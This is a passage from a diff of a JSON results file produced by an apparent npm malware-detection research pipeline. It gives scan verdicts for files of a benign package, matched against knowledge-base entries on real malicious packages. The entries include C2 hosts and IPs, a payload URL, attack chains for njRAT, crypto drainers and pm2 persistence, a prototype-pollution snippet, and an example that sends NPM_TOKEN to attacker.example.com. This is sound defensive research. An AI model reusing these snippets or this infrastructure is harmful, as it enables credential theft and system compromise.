+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102926_037825_snippet_2",
+              "source_package": "@ledgerhq/connect-kit (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102926_037825/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4104751944541931,
+              "code_similarity": 0.43932968378067017,
+              "behavior_similarity": 0.38162070512771606,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation based on report\nimport('2e6d5f64604be31').then(drainer => drainer.init());",
+                "code_behavior": "At import-time or during package initialization, the code dynamically imports and executes a secondary npm package (2e6d5f64604be31), which acts as a crypto drainer, enabling further malicious actions such as wallet draining and unauthorized asset transfers.",
+                "malice_analysis": {
+                  "why_suspicious": "The code dynamically downloads and executes an unlisted, suspiciously named secondary package at runtime, a common technique for evading static analysis and delivering malware payloads.",
+                  "violated_expectations": "Legitimate packages should not download or execute arbitrary code from external, unvetted sources at runtime, especially without user awareness or consent.",
+                  "similar_legitimate_use": "Dynamic imports are used in legitimate plugin systems, but only from trusted, well-known sources and never for unlisted or obfuscated packages.",
+                  "key_indicators": [
+                    "Dynamic import of a non-standard, suspiciously named package (2e6d5f64604be31)",
+                    "No user notification or consent for code execution",
+                    "Obfuscation of malicious payload delivery via secondary package",
+                    "Presence of code that enables further malicious actions after import"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (import-time or during package initialization)",
+                  "file_location": "main application code (in @ledgerhq/connect-kit v1.1.5 and v1.1.6)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@ledgerhq/connect-kit",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.5, 1.1.6, 1.1.7",
+                  "why_malicious": "Versions 1.1.5, 1.1.6, and 1.1.7 of @ledgerhq/connect-kit were compromised to include or download crypto drainer malware. The malicious code is designed to either directly or indirectly execute unauthorized transactions, stealing cryptocurrency from users' wallets. The attack is triggered during normal application use, presenting fake wallet connection prompts and exfiltrating assets to attacker-controlled wallets without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious versions of @ledgerhq/connect-kit are published to npm and included as dependencies in target applications.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is distributed to end-user applications via dependency installation."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the application loads the compromised package, malicious code is executed either at import-time or during user interaction.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is presented with a fake wallet connection modal or a secondary drainer package is loaded and executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "User interacts with the fake modal and connects their wallet, or the secondary drainer package initializes.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malware initiates unauthorized transactions using the connected wallet."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware drains funds from the connected wallet to attacker-controlled addresses.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen cryptocurrency, achieving the final objective of the attack."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Display of unexpected or suspicious wallet connection modals in applications using @ledgerhq/connect-kit",
+                    "Automatic initiation of wallet transactions without explicit user consent or confirmation",
+                    "Dynamic import or download of secondary npm packages (such as 2e6d5f64604be31) at runtime",
+                    "Execution of code that interacts with browser wallet APIs outside of normal user-initiated flows"
+                  ],
+                  "file_indicators": [
+                    "Presence of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7 in package.json, package-lock.json, or yarn.lock",
+                    "References to package 2e6d5f64604be31 in source code or dependency trees",
+                    "Unexpected changes or additions to node_modules/@ledgerhq/connect-kit/main.js or related files"
+                  ],
+                  "network_indicators": [
+                    "Outbound cryptocurrency transactions to known attacker wallet addresses immediately following wallet connection events",
+                    "Unexpected network requests initiated during or after wallet connection flows",
+                    "Connections to domains or endpoints associated with the secondary drainer package"
+                  ],
+                  "how_to_detect": "Monitor dependency manifests (package.json, lockfiles) for the use of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7. Analyze application runtime for the presence of fake wallet connection modals and any unauthorized transaction initiations. Flag any dynamic imports or downloads of unlisted npm packages, especially those matching suspicious patterns (e.g., 2e6d5f64604be31). Monitor for network activity involving known attacker wallet addresses or suspicious transaction patterns immediately following wallet connection events. Review source code and built artifacts for references to secondary drainer packages or unexpected modifications to wallet connection logic."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202035_950938_snippet_2",
+              "source_package": "pingan-vue-floating (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202035_950938/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3980487287044525,
+              "code_similarity": 0.36208462715148926,
+              "behavior_similarity": 0.43401283025741577,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const pm2 = require('pm2');\npm2.connect((err) => {\n    if (err) {\n        return;\n    }\n    const script = __dirname + '/app.js';\n    const name = 'pingan-vue-floating-server-ap'\n    const pm2Options = {\n        script,\n        name,\n        exec_mode: 'cluster',\n        daemon: true\n    };\n    pm2.start(pm2Options, (err, apps) => {\n        if (err) {\n            pm2.disconnect();\n        } else {\n            pm2.disconnect();\n        }\n    });\n});",
+                "code_behavior": "At postinstall, the code uses pm2 to launch app.js as a persistent, background daemon in cluster mode, ensuring the malicious process remains running and is automatically restarted if terminated.",
+                "malice_analysis": {
+                  "why_suspicious": "Spawning a background daemon on install is highly unusual and enables persistent malicious activity, making the malware resilient to process termination.",
+                  "violated_expectations": "Normal packages do not install persistent background processes on developer machines during installation.",
+                  "similar_legitimate_use": "pm2 is used legitimately to manage Node.js services in production environments, but not during package installation on end-user or developer systems.",
+                  "key_indicators": [
+                    "pm2 used to daemonize a script at install time",
+                    "background process persistence initiated by package install"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "pingan-vue-floating",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.7",
+                  "why_malicious": "The package is malicious because it establishes a persistent, encrypted two-way communication channel with a remote command-and-control (C2) server upon installation, exfiltrates host and machine identifiers, and executes attacker-supplied, encrypted JavaScript payloads on the victim's machine. The package employs obfuscation, background daemonization, and anti-analysis techniques to evade detection and enable remote code execution, posing a severe risk to any system where it is installed."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Upon installation, the postinstall script executes index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Daemonization of malicious process"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js uses pm2 to launch app.js as a persistent background daemon.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of malicious logic in app.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "app.js checks for a marker file and, if absent, creates it and starts the heartbeat loop.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Initiation of periodic C2 communication"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Every 45 seconds, heartbeat collects host info and sends it (encrypted) to the C2 server.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "C2 server can respond with encrypted payloads"
+                  },
+                  {
+                    "step": 5,
+                    "action": "If a payload is received, it is decrypted, base64-decoded, and executed via eval, enabling remote code execution.",
+                    "implemented_by": [
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker achieves arbitrary code execution on victim machine"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall script executing custom Node.js code during package installation",
+                    "pm2 used to daemonize scripts at install time, creating persistent background processes",
+                    "periodic (every 45 seconds) outbound HTTPS POST requests to hardcoded or obfuscated C2 domains",
+                    "AES-encrypted payloads in network traffic between host and C2 server",
+                    "eval execution of decrypted, network-supplied JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "Presence of node_logs.txt in system temp directory",
+                    "Obfuscated or unusually large app.js file with benign exports and hidden malicious logic at the end",
+                    "index.js that only launches pm2 with app.js as the target script"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to ql.rustdesk.net or 62.234.32.226",
+                    "Encrypted payloads in POST body to /api/index and /api/captcha endpoints",
+                    "User-Agent string: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134"
+                  ],
+                  "how_to_detect": "Monitor for npm packages with postinstall scripts that launch pm2 or background daemons. Flag packages that create marker files in temp directories (e.g., node_logs.txt) and those that make periodic outbound HTTPS POST requests to suspicious or obfuscated domains, especially with encrypted payloads. Detect use of eval on decrypted network data. Analyze app.js files for obfuscated code and hidden logic at the end of otherwise benign files. Correlate network indicators such as connections to ql.rustdesk.net or 62.234.32.226 with the presence of AES-encrypted payloads and suspicious User-Agent strings."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456618_snippet_6",
+              "source_package": "jdb.js, db-json.js (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456618/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3947990834712982,
+              "code_similarity": 0.4322206377983093,
+              "behavior_similarity": 0.3573775291442871,
+              "matched_snippet": {
+                "snippet_id": "snippet_6",
+                "code_snippet": "require('jdb.js');",
+                "code_behavior": "At import-time or runtime, the last line of dbmanager.js explicitly loads and executes jdb.js, covertly triggering the malicious infection chain even if the user only interacts with db-json.js.",
+                "malice_analysis": {
+                  "why_suspicious": "A hidden require statement at the end of a file is a stealthy method to trigger malware execution without user awareness.",
+                  "violated_expectations": "Legitimate code does not secretly load unrelated or malicious modules, especially at the end of a file.",
+                  "similar_legitimate_use": "Dynamic requires are sometimes used for plugin systems, but not for loading unrelated or malicious code.",
+                  "key_indicators": [
+                    "Hidden require statement at end of file",
+                    "Triggers execution of malicious code path",
+                    "No legitimate reason for this import"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "db-json.js/dbmanager.js (last line)",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "jdb.js, db-json.js",
+                  "package_manager": "npm",
+                  "package_versions": "jdb.js: 1.0.0; db-json.js: 1.0.3, 1.0.4",
+                  "why_malicious": "Both packages are explicitly crafted to deliver and execute the njRAT/Bladabindi Remote Access Trojan on victim systems. 'jdb.js' directly drops and launches the RAT executable, while 'db-json.js' covertly includes 'jdb.js' as a dependency and triggers its execution, resulting in full system compromise, persistent remote access, and potential data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs db-json.js or jdb.js package.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code is prepared for execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "db-json.js pulls in jdb.js as a dependency and/or explicitly requires it in dbmanager.js.",
+                    "implemented_by": [
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Triggers execution of jdb.js malicious logic."
+                  },
+                  {
+                    "step": 3,
+                    "action": "jdb.js install script executes obfuscated module.js.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "module.js decodes and writes patch.exe to disk, then launches it."
+                  },
+                  {
+                    "step": 4,
+                    "action": "patch.exe (njRAT dropper) copies itself to TEMP as dchps.exe, modifies firewall rules, and launches RAT payload.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System is infected with njRAT."
+                  },
+                  {
+                    "step": 5,
+                    "action": "dchps.exe (njRAT) connects to C2 server, awaits commands for remote control, data theft, and system manipulation.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains full remote access and control over the victim system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm install scripts that execute obfuscated JavaScript files unrelated to build or setup",
+                    "Presence of base64 or binary blobs in JavaScript files that decode to Windows executables",
+                    "Unexpected creation and execution of .exe files (e.g., patch.exe, dchps.exe) during npm package install",
+                    "Modification of Windows firewall rules via netsh.exe during or after npm install",
+                    "Outbound connections to hardcoded njRAT C2 IP addresses or suspicious external URLs"
+                  ],
+                  "file_indicators": [
+                    "patch.exe or dchps.exe present in the TEMP directory",
+                    "Obfuscated module.js file containing encoded payloads in jdb.js",
+                    "package.json with suspicious install scripts (e.g., \"install\": \"node module.js\")",
+                    "dbmanager.js with a hidden require('jdb.js') statement at the end of the file"
+                  ],
+                  "network_indicators": [
+                    "Connection attempts to 46.185.116.2:5552 (njRAT C2 server)",
+                    "Access to https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe",
+                    "Unusual outbound traffic from npm install or Node.js processes to external IPs or domains"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for install scripts that execute obfuscated or encoded JavaScript files. Flag packages that write and execute .exe files, especially in TEMP directories, during or after installation. Detect and alert on modifications to Windows firewall rules via netsh.exe initiated by npm or Node.js processes. Monitor for outbound connections to known njRAT C2 infrastructure (e.g., 46.185.116.2:5552) or suspicious Dropbox URLs. Scan package code for hidden require statements that load unrelated or suspicious modules, particularly at the end of files."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780687_snippet_1",
+              "source_package": "web3_nextjs_backend (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780687/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39026957750320435,
+              "code_similarity": 0.3243284225463867,
+              "behavior_similarity": 0.456210732460022,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "app.listen(5000, () => { console.log('Listening on port 5000'); });",
+                "code_behavior": "At runtime, the code opens TCP port 5000 and begins listening for incoming network connections, exposing the backend to remote access and enabling potential reverse shell or unauthorized command execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Opening a network port and listening for connections without authentication or documentation is highly suspicious, especially in a codebase intended for a job interview exercise. This behavior can facilitate unauthorized remote access.",
+                  "violated_expectations": "A legitimate backend should not expose arbitrary ports or listen for remote connections without explicit user intent, authentication, or security controls. Such behavior is not expected in a code sample for interview purposes.",
+                  "similar_legitimate_use": "A properly documented and secured web server may listen on a port for HTTP requests, but this should be clearly communicated and protected by authentication mechanisms.",
+                  "key_indicators": [
+                    "Unexplained network listener on port 5000",
+                    "No authentication or access control on the listening port",
+                    "Potential for remote shell or command execution via open port",
+                    "Lack of documentation or user notification regarding network exposure"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "backend server entry point (e.g., index.js or app.js in web3_nextjs_backend)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "web3_nextjs_backend",
+                  "package_manager": "npm",
+                  "package_versions": "GitHub-only, not published to npmjs.com",
+                  "why_malicious": "The package contains code that opens a network port and listens for unauthenticated connections, enabling potential remote access or reverse shell attacks. It also exfiltrates sensitive data, such as crypto wallet secrets, by reading environment variables or local files and sending them to an external, attacker-controlled domain under the pretense of a job interview exercise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim clones and runs the backend and frontend npm projects locally as part of a job interview exercise.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Backend code opens TCP port 5000 and listens for incoming connections, potentially enabling remote access or reverse shell.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker may gain remote access to the victim's machine"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code accesses environment variables or local files to extract wallet information.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Sensitive wallet data is collected"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to an external domain via HTTPS POST requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives wallet secrets and can drain the victim's crypto wallet"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Backend code opening arbitrary network ports (e.g., 5000) without clear documentation or authentication",
+                    "Outbound HTTPS POST requests to suspicious or unrelated domains (e.g., flickthebean.onrender.com)",
+                    "Access to environment variables or local files containing wallet or secret information without user consent"
+                  ],
+                  "file_indicators": [
+                    "Presence of code that listens on port 5000 in backend entry points (e.g., index.js, app.js)",
+                    "Hardcoded external domains in fetch or HTTP request code (e.g., flickthebean.onrender.com)",
+                    "References to wallet, MetaMask, or secret keys in code or configuration files"
+                  ],
+                  "network_indicators": [
+                    "Connections to flickthebean.onrender.com",
+                    "Unusual outbound HTTPS traffic immediately after running npm projects",
+                    "Unexpected inbound connections to local port 5000"
+                  ],
+                  "how_to_detect": "Monitor for npm projects or local development servers that open unexpected network ports or accept unauthenticated connections. Flag code that makes outbound requests to untrusted or hardcoded domains, especially when transmitting environment variables or wallet secrets. Use static analysis to detect hardcoded domains and references to sensitive data, and dynamic analysis to observe runtime network and file access behaviors."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/dev/date.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/dev/dateNext.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/dev/feel.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/dev/getValue.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/dev/lodash.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/imicros-flow/0.3.8/package/dev/props.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 2,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "props_slice_1",
+          "code_snippet": "const { inspect } = require(\"util\");\n\nconst ctx = {\n    meta: {\n        acl: {\n            ownerId: \"any\",\n            serviceToken: \"my_token\"\n        }\n    }\n};\n\nfunction third ({ meta }) {\n    console.log(inspect(meta, true, 99));\n}\n\nfunction second ({ b, ctx: { meta: { acl: { ownerId = null, serviceId = null, ...more }} }, ...props }) {\n    console.log(b);\n    console.log(ownerId);\n    console.log(serviceId);\n    console.log(props);\n    console.log({ b, ...props });\n    console.log(inspect({ b, ctx, ...props }, true, 99));\n    third({ meta: { acl: { ownerId, serviceId, ...more }} });\n} \n\n\nfunction first ({ a, b, c, ...props }) {\n    second({ x: \"a\", a, b, c, ...props });\n}\n\nfirst({ a:1, b:2, c:3, ctx });",
+          "is_malicious": false,
+          "malice_score": 0.4460483570893605,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses a hardcoded service token \"my_token\" and ownerId \"any\" within a nested context object, then logs this sensitive metadata using util.inspect across multiple function calls, facilitating potential exposure of sensitive access control information through console output.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code accesses a hardcoded service token and ownerId within a nested context object and logs this metadata to the console using util.inspect. While it does handle sensitive-looking data, it does not perform any suspicious operations such as network communication, environment variable access, or prototype pollution. The code simply logs data for inspection and does not exfiltrate or manipulate system state. Compared to the known malicious patterns, it lacks key indicators such as network requests to attacker domains, environment variable harvesting, or prototype pollution. The presence of hardcoded tokens and logging alone is not sufficient to classify this as malicious, as it may be part of debugging or legitimate internal logging.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205359_429073_snippet_4",
+              "source_package": "jquery (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205359_429073/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4501101076602936,
+              "code_similarity": 0.4773041009902954,
+              "behavior_similarity": 0.42291611433029175,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "let list_of_npm_packages = JSON.parse(`\n[\n  {\n    \"cool-package\": {\n      \"license\": \"MIT\",\n      \"github\": \"https://github.com/someuser/cool-package\"\n    }\n  },\n  {\n    \"__proto__\": {\n      \"toString\": \"april fools\"\n    }\n  }\n]`);\n\nlist_of_npm_packages.forEach((package) => {\n     for (const [propertyKey, objectValue] of Object.entries(package)) {\n          for (const [name, value] of Object.entries(objectValue)) {            \n            if (!packagesMap[propertyKey]) {\n            packagesMap[propertyKey] = {}\n            }\n            packagesMap[propertyKey][name] = value \n          }\n     }\n})\n\nconst a = {}\nconsole.log(a.toString)  // prints ‘april fools’\nconsole.log({}.toString) // prints ‘april fools’",
+                "code_behavior": "At runtime, the code processes a list of package objects, one of which has a __proto__ key. When merged into packagesMap, this pollutes Object.prototype with a toString property, causing all objects to inherit the attacker's toString implementation.",
+                "malice_analysis": {
+                  "why_suspicious": "User-controlled data is used as object keys without filtering, allowing prototype pollution and global method override, which can disrupt application logic or security.",
+                  "violated_expectations": "Mapping user data should not affect the global object prototype. Assignments should be limited to intended objects, not the prototype chain.",
+                  "similar_legitimate_use": "Mapping package data is common, but should never allow prototype chain modification or global method overrides.",
+                  "key_indicators": [
+                    "User-controlled __proto__ key in data",
+                    "Assignment to packagesMap[propertyKey][name] without key validation",
+                    "Global override of toString method on Object.prototype"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "application code processing package lists",
+                  "required_permissions": [
+                    "application_object_access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "jquery",
+                  "package_manager": "npm",
+                  "package_versions": "<3.4.0",
+                  "why_malicious": "The affected versions of jQuery allow prototype pollution via the extend() API. Attackers can inject properties into the Object prototype by supplying objects with __proto__, constructor, or prototype keys as input to deep merge operations. This enables privilege escalation, denial of service, or arbitrary code path manipulation in applications that use jQuery.extend(true, ...) with untrusted input, as malicious properties become globally accessible on all objects."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker submits user-controlled JSON or object containing a __proto__ property.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Application processes the input using unsafe deep merge or mapping."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Application merges or assigns the user input into an object using jQuery.extend() or direct assignment, without filtering prototype keys.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "The Object prototype is polluted with attacker-controlled properties."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Subsequent code accesses properties (e.g., isAdmin, toString) on objects, which now resolve to attacker-controlled values via the prototype chain.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Privilege escalation, logic manipulation, or denial of service."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Deep merge operations (e.g., jQuery.extend(true, ...)) involving user-controlled objects containing __proto__, constructor, or prototype keys",
+                    "Assignment to object properties using user-controlled keys without filtering for prototype pollution vectors",
+                    "Unexpected global properties or methods (e.g., isAdmin, toString) appearing on Object.prototype at runtime"
+                  ],
+                  "file_indicators": [
+                    "Use of jQuery.extend(true, ...) with untrusted or user-supplied input",
+                    "Direct assignment to [\"__proto__\"], [\"constructor\"], or [\"prototype\"] in application code"
+                  ],
+                  "network_indicators": [],
+                  "how_to_detect": "Monitor for deep merge or object assignment operations where user-controlled data is used as keys, especially if the keys are __proto__, prototype, or constructor. Audit code for use of jQuery.extend(true, ...) or similar recursive merge utilities with untrusted input. Use static analysis to flag assignments to __proto__ or suspicious object key usage. At runtime, detect unexpected properties or methods on Object.prototype or global objects, such as isAdmin or toString, that are not part of the application's intended logic."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_457485_snippet_1",
+              "source_package": " ()",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_457485/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.445852667093277,
+              "code_similarity": 0.3238403797149658,
+              "behavior_similarity": 0.5678649544715881,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Example of a malicious code injection in JavaScript\nconst https = require('https');\nconst token = process.env.NPM_TOKEN;\nhttps.request({\n  hostname: 'attacker.example.com',\n  path: '/exfil',\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' }\n}, req => {}).end(JSON.stringify({ token }));",
+                "code_behavior": "At import-time or runtime, the code accesses the NPM_TOKEN environment variable, serializes its value, and sends it to a hardcoded attacker-controlled domain via HTTPS POST, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically accesses sensitive environment variables (NPM_TOKEN) and transmits their values to an external, attacker-controlled server without user consent, which is a clear indicator of credential theft.",
+                  "violated_expectations": "Legitimate open source packages should not access and transmit environment variables containing secrets to untrusted external servers during import or runtime. Such behavior is outside the scope of normal package functionality.",
+                  "similar_legitimate_use": "Some packages may send telemetry or crash reports, but these should never include secrets or tokens, and should only communicate with trusted, documented domains.",
+                  "key_indicators": [
+                    "Access to environment variables containing authentication tokens or secrets",
+                    "Outbound HTTPS requests to hardcoded, untrusted domains",
+                    "Network activity unrelated to the package's documented purpose",
+                    "Exfiltration of sensitive data at import-time or runtime"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime (depending on the injected code location)",
+                  "file_location": "core source file of the compromised open source package (e.g., index.js, main.py, etc.)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": "The report highlights the risk of malicious code injections in open source software supply chains, where attackers insert harmful code (malicious commits) into widely used packages. These compromised packages are then distributed at scale, resulting in security breaches and widespread compromise. The macro-level threat is that a trusted component becomes malicious due to injected code, enabling large-scale attacks through credential exfiltration or remote code execution."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is injected into a popular open source package via a compromised commit.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Distribution of the compromised package to downstream users."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When users install or import the package, the malicious code executes, exfiltrating secrets or running attacker-controlled payloads.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data and/or further compromise of user systems."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unexpected network requests during package installation or import",
+                    "Access to environment variables containing secrets or tokens",
+                    "Execution of remote code via shell commands in install scripts",
+                    "Outbound connections to hardcoded, untrusted domains during install or import"
+                  ],
+                  "file_indicators": [
+                    "package.json scripts.postinstall invoking curl or wget",
+                    "setup.py with custom install commands downloading and executing remote code",
+                    "Unexplained new or modified files in package source related to network or shell execution"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS connections to attacker.example.com or other untrusted, hardcoded domains",
+                    "POST requests containing environment variable values or credentials to external servers"
+                  ],
+                  "how_to_detect": "Monitor package installation and import events for unexpected network activity, especially outbound connections to untrusted or hardcoded domains. Flag packages that access sensitive environment variables or execute remote code during install or import. Use static analysis to detect suspicious scripts in package.json, setup.py, or other build/install files. Cross-reference contacted domains with threat intelligence feeds. Alert on install scripts that invoke curl, wget, or shell execution of remote code."
+                }
+              }
+            },
+            {
